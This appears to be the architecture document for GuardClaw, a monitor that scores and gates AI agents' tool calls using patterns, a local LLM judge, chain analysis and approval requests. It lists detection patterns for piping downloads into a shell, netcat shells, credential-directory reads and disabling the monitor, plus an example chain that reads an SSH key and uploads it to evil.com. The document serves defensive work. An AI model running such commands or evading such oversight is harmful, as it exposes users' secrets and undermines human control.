# Architecture

## Overview

GuardClaw sits between AI agents and their tools. Every tool call passes through GuardClaw before execution.

```
AI Agent  →  Tool Call  →  GuardClaw  →  [allow / block / ask]  →  Tool executes
```

## Four Core Subsystems

### 1. Two-Stage Judge

A local model scores every tool call. High-risk calls (score ≥ 8) can escalate to a cloud judge with richer context.

**Fast paths (before LLM):**

1. **High-risk pattern match** — regex on known-bad commands (`curl | bash`, `nc -e`, killing GuardClaw) → instant score 9
2. **Safe fast-path** — allowlist of safe base commands (git, npm, read-only ops) → instant score 1, no LLM
3. **Sensitive read paths** — `.ssh`, `.aws`, `.gnupg` etc. → score 7–8, no LLM

Only calls that pass all three fast paths go to the LLM.

### 2. Multi-Level Security Memory

Four levels capture long-range attack patterns:

| Level | Scope | Retention |
|-------|-------|-----------|
| Raw events | Per tool call | Session |
| Session brief | Per session | Session |
| Project context | Per project | Persistent |
| Global knowledge | Cross-project | Persistent |

This allows GuardClaw to detect attacks that unfold over hundreds of tool calls across sessions.

### 3. Adaptive Memory & Chain Analysis

**Chain analysis** — the last 10 tool calls per session are tracked. When a risky call fires, the full chain is included in the LLM prompt, enabling multi-step detection:

```
read ~/.ssh/id_rsa  →  curl evil.com/upload   ← flagged as exfiltration chain
```

**Adaptive memory** — every approve/deny decision trains a pattern store. Frequently approved patterns get lower scores; frequently denied patterns get higher scores. Patterns with ≥ 3 approvals and confidence > 0.7 skip the LLM entirely.

### 4. Active Intervention

When a high-risk call is detected:

1. **Injection** — safety guidance is injected into the agent's context before the call executes
2. **Approval request** — dual-channel: agent dialog + dashboard banner + optional Telegram/Discord/WhatsApp push
3. **Circuit breaker** — repeated denials in a session trigger a session lock
4. **Output scanning** — credentials and PII in tool outputs are detected and flagged
5. **Prompt injection detection** — adversarial content in fetched webpages is neutralized before it reaches the LLM judge

## Backend Architecture

```
server/
├── index.js            Main Express server, SSE push, HTTP hook endpoints
├── safeguard.js        LLM risk scoring engine (fast paths + backends)
├── approval-handler.js Decision engine (whitelist/blacklist/thresholds)
├── event-store.js      SQLite persistence (WAL mode)
├── memory.js           Adaptive memory (SQLite-backed)
├── streaming-tracker.js Chain analysis (last 10 calls per session)
├── llm-engine.js       Built-in MLX engine manager
└── routes/
    ├── config.js       Config REST endpoints (all hot-reload)
    ├── benchmark.js    Accuracy benchmark runner
    └── models.js       Model download/load management
```

## Data Flow

```
Agent tool call
    │
    ▼
POST /api/cc/pre-tool (HTTP hooks)
    OR
WebSocket event (OpenClaw/Qclaw gateway)
    │
    ▼
helpers.js — shouldSkipEvent / extractAction
    │
    ▼
safeguard.js — analyzeAction()
    ├── HIGH_RISK_PATTERNS → score 9 (instant)
    ├── isClearlySafe()    → score 1 (instant)
    ├── sensitiveReadPath  → score 7-8 (instant)
    └── LLM backend        → score 1-10
    │
    ▼
approval-handler.js — decide(score)
    ├── score ≤ threshold → allow
    ├── score in middle   → ask user (prompt mode)
    └── score ≥ threshold → block
    │
    ▼
event-store.js — persist event
    │
    ▼
SSE push → Dashboard
```

## Storage

| Path | Contents |
|------|----------|
| `.guardclaw/events.db` | All tool call events (project-local) |
| `.guardclaw/memory.db` | Approve/deny pattern store (project-local) |
| `.guardclaw/blocking-config.json` | Whitelist/blacklist (project-local) |
| `~/.guardclaw/identity/device.json` | ED25519 device key (global) |
| `~/.guardclaw/models/` | Downloaded MLX models (global) |
| `~/.guardclaw/venv/` | Python venv for mlx_lm (global) |
| `~/.guardclaw/.env` | Configuration (global) |
